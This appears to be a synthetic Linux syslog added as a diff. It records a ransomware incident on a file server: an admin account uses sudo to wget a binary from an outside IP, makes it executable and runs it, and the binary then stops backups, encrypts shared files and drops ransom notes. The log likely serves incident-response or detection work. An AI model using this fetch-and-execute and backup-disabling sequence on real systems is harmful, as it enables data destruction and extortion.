@@ -1,0 +1,20 @@
+Jun 17 22:01:14 fs-prod-07 systemd[1]: Started Daily apt upgrade and clean activities.
+Jun 17 22:14:50 fs-prod-07 sshd[5521]: Accepted password for fileadmin from 10.0.9.40 port 49210 ssh2
+Jun 17 22:16:32 fs-prod-07 sudo:  fileadmin : TTY=pts/0 ; PWD=/home/fileadmin ; USER=root ; COMMAND=/usr/bin/wget http://193.43.55.12/update.bin -O /tmp/update.bin
+Jun 17 22:16:48 fs-prod-07 sudo:  fileadmin : TTY=pts/0 ; PWD=/home/fileadmin ; USER=root ; COMMAND=/bin/chmod +x /tmp/update.bin
+Jun 17 22:17:05 fs-prod-07 sudo:  fileadmin : TTY=pts/0 ; PWD=/home/fileadmin ; USER=root ; COMMAND=/tmp/update.bin
+Jun 17 22:17:06 fs-prod-07 kernel: update.bin[6012]: segfault avoided; child process spawned pid=6013
+Jun 17 22:17:10 fs-prod-07 update.bin[6013]: deleting volume shadow copies
+Jun 17 22:17:11 fs-prod-07 systemd[1]: Stopping LVM2 snapshot service...
+Jun 17 22:17:12 fs-prod-07 systemd[1]: backup.service: Deactivated successfully.
+Jun 17 22:17:13 fs-prod-07 systemd[1]: Stopped Bareos File Daemon (backup agent).
+Jun 17 22:17:20 fs-prod-07 update.bin[6013]: enumerating /srv/shares (48211 files)
+Jun 17 22:17:34 fs-prod-07 kernel: EXT4-fs (sdb1): high write volume - 9200 files modified in 14s
+Jun 17 22:17:50 fs-prod-07 kernel: EXT4-fs (sdb1): high write volume - 18700 files modified in 30s
+Jun 17 22:18:21 fs-prod-07 kernel: EXT4-fs (sdb1): high write volume - 41020 files modified in 61s
+Jun 17 22:18:40 fs-prod-07 update.bin[6013]: wrote 48211 files with extension .LOCKBIT3
+Jun 17 22:18:41 fs-prod-07 update.bin[6013]: dropped ransom note RESTORE-MY-FILES.txt in 312 directories
+Jun 17 22:18:55 fs-prod-07 kernel: outbound connection ESTABLISHED SRC=10.0.9.7 DST=193.43.55.12 DPT=443
+Jun 17 22:19:30 fs-prod-07 update.bin[6013]: encryption complete; self-deleting
+Jun 17 22:20:01 fs-prod-07 CRON[6200]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 17 22:45:11 fs-prod-07 smbd[7001]: client 10.0.9.55 reported 0 readable files in /srv/shares/finance
